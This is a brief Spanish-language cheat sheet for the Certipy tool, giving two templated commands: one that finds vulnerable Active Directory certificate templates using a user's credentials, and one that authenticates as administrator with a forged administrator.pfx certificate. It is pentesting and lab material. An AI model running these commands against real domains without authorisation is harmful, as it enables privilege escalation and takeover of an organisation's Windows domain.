# Certipy Cheat Sheet

#### Conocer el nivel y saber que template es vulnerable
```
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <IP-ADDRESS> -vulnerable -stdout
```

#### Autenticarse usando el TGT creado (administrator.pfx)
```
certipy auth -pfx 'administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip <IP-ADDRESS>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)